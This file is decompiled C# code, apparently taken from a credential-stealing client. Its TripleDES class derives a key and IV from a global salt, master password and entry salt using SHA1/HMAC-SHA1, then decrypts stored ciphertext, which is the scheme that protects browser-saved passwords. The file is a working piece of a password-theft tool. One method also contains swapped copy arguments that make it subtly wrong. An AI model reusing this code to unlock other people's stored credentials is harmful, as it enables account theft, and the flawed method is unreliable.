using System;
using System.Security.Cryptography;

namespace client.Decryption
{
	// Token: 0x02000037 RID: 55
	internal class TripleDES
	{
		// Token: 0x17000066 RID: 102
		// (get) Token: 0x0600015C RID: 348 RVA: 0x0000678F File Offset: 0x0000498F
		// (set) Token: 0x0600015D RID: 349 RVA: 0x00006797 File Offset: 0x00004997
		private byte[] ciphertext { get; set; }

		// Token: 0x17000067 RID: 103
		// (get) Token: 0x0600015E RID: 350 RVA: 0x000067A0 File Offset: 0x000049A0
		// (set) Token: 0x0600015F RID: 351 RVA: 0x000067A8 File Offset: 0x000049A8
		private byte[] globalsalt { get; set; }

		// Token: 0x17000068 RID: 104
		// (get) Token: 0x06000160 RID: 352 RVA: 0x000067B1 File Offset: 0x000049B1
		// (set) Token: 0x06000161 RID: 353 RVA: 0x000067B9 File Offset: 0x000049B9
		private byte[] masterpassword { get; set; }

		// Token: 0x17000069 RID: 105
		// (get) Token: 0x06000162 RID: 354 RVA: 0x000067C2 File Offset: 0x000049C2
		// (set) Token: 0x06000163 RID: 355 RVA: 0x000067CA File Offset: 0x000049CA
		private byte[] entrysalt { get; set; }

		// Token: 0x1700006A RID: 106
		// (get) Token: 0x06000164 RID: 356 RVA: 0x000067D3 File Offset: 0x000049D3
		// (set) Token: 0x06000165 RID: 357 RVA: 0x000067DB File Offset: 0x000049DB
		public byte[] key { get; private set; }

		// Token: 0x1700006B RID: 107
		// (get) Token: 0x06000166 RID: 358 RVA: 0x000067E4 File Offset: 0x000049E4
		// (set) Token: 0x06000167 RID: 359 RVA: 0x000067EC File Offset: 0x000049EC
		public byte[] IV { get; private set; }

		// Token: 0x06000168 RID: 360 RVA: 0x000067F5 File Offset: 0x000049F5
		public TripleDES(byte[] _ciphertext, byte[] _globalsalt, byte[] _masterpass, byte[] _entrysalt)
		{
			this.ciphertext = _ciphertext;
			this.globalsalt = _globalsalt;
			this.masterpassword = _masterpass;
			this.entrysalt = _entrysalt;
		}

		// Token: 0x06000169 RID: 361 RVA: 0x0000681A File Offset: 0x00004A1A
		public TripleDES(byte[] _globalsalt, byte[] _masterpassword, byte[] _entrysalt)
		{
			this.globalsalt = _globalsalt;
			this.masterpassword = _masterpassword;
			this.entrysalt = _entrysalt;
		}

		// Token: 0x0600016A RID: 362 RVA: 0x00006838 File Offset: 0x00004A38
		public void Compute_void()
		{
			SHA1CryptoServiceProvider sha1CryptoServiceProvider = new SHA1CryptoServiceProvider();
			byte[] array = new byte[this.globalsalt.Length + this.masterpassword.Length];
			Array.Copy(this.globalsalt, 0, array, 0, this.globalsalt.Length);
			Array.Copy(this.masterpassword, 0, array, this.globalsalt.Length, this.masterpassword.Length);
			byte[] array2 = sha1CryptoServiceProvider.ComputeHash(array);
			byte[] array3 = new byte[array2.Length + this.entrysalt.Length];
			Array.Copy(array2, 0, array3, 0, array2.Length);
			Array.Copy(this.entrysalt, 0, array3, array2.Length, this.entrysalt.Length);
			byte[] key = sha1CryptoServiceProvider.ComputeHash(array3);
			byte[] array4 = new byte[20];
			Array.Copy(this.entrysalt, 0, array4, 0, this.entrysalt.Length);
			for (int i = this.entrysalt.Length; i < 20; i++)
			{
				array4[i] = 0;
			}
			byte[] array5 = new byte[array4.Length + this.entrysalt.Length];
			Array.Copy(array4, 0, array5, 0, array4.Length);
			Array.Copy(this.entrysalt, 0, array5, array4.Length, this.entrysalt.Length);
			byte[] array6;
			byte[] array9;
			using (HMACSHA1 hmacsha = new HMACSHA1(key))
			{
				array6 = hmacsha.ComputeHash(array5);
				byte[] array7 = hmacsha.ComputeHash(array4);
				byte[] array8 = new byte[array7.Length + this.entrysalt.Length];
				Array.Copy(array7, 0, array8, 0, array7.Length);
				Array.Copy(this.entrysalt, 0, array8, array7.Length, this.entrysalt.Length);
				array9 = hmacsha.ComputeHash(array8);
			}
			byte[] array10 = new byte[array6.Length + array9.Length];
			Array.Copy(array6, 0, array10, 0, array6.Length);
			Array.Copy(array9, 0, array10, array6.Length, array9.Length);
			this.key = new byte[24];
			for (int j = 0; j < this.key.Length; j++)
			{
				this.key[j] = array10[j];
			}
			this.IV = new byte[8];
			int num = this.IV.Length - 1;
			for (int k = array10.Length - 1; k >= array10.Length - this.IV.Length; k--)
			{
				this.IV[num] = array10[k];
				num--;
			}
		}

		// Token: 0x0600016B RID: 363 RVA: 0x00006A88 File Offset: 0x00004C88
		public byte[] Compute()
		{
			byte[] array = new byte[this.globalsalt.Length + this.masterpassword.Length];
			Buffer.BlockCopy(this.globalsalt, 0, array, 0, this.globalsalt.Length);
			Buffer.BlockCopy(this.masterpassword, 0, array, this.globalsalt.Length, this.masterpassword.Length);
			byte[] array2 = new SHA1Managed().ComputeHash(array);
			byte[] array3 = new byte[array2.Length + this.entrysalt.Length];
			Buffer.BlockCopy(array2, 0, array3, 0, array2.Length);
			Buffer.BlockCopy(this.entrysalt, 0, array3, this.entrysalt.Length, array2.Length);
			byte[] key = new SHA1Managed().ComputeHash(array3);
			byte[] array4 = new byte[20];
			Array.Copy(this.entrysalt, 0, array4, 0, this.entrysalt.Length);
			for (int i = this.entrysalt.Length; i < 20; i++)
			{
				array4[i] = 0;
			}
			byte[] array5 = new byte[array4.Length + this.entrysalt.Length];
			Array.Copy(array4, 0, array5, 0, array4.Length);
			Array.Copy(this.entrysalt, 0, array5, array4.Length, this.entrysalt.Length);
			byte[] array6;
			byte[] array9;
			using (HMACSHA1 hmacsha = new HMACSHA1(key))
			{
				array6 = hmacsha.ComputeHash(array5);
				byte[] array7 = hmacsha.ComputeHash(array4);
				byte[] array8 = new byte[array7.Length + this.entrysalt.Length];
				Buffer.BlockCopy(array7, 0, array8, 0, array7.Length);
				Buffer.BlockCopy(this.entrysalt, 0, array8, array7.Length, this.entrysalt.Length);
				array9 = hmacsha.ComputeHash(array8);
			}
			byte[] array10 = new byte[array6.Length + array9.Length];
			Array.Copy(array6, 0, array10, 0, array6.Length);
			Array.Copy(array9, 0, array10, array6.Length, array9.Length);
			this.key = new byte[24];
			for (int j = 0; j < this.key.Length; j++)
			{
				this.key[j] = array10[j];
			}
			this.IV = new byte[8];
			int num = this.IV.Length - 1;
			for (int k = array10.Length - 1; k >= array10.Length - this.IV.Length; k--)
			{
				this.IV[num] = array10[k];
				num--;
			}
			Array sourceArray = TripleDESHelper.DESCBC_Decrypt_Byte(this.key, this.IV, this.ciphertext);
			byte[] array11 = new byte[24];
			Array.Copy(sourceArray, array11, array11.Length);
			return array11;
		}
	}
}
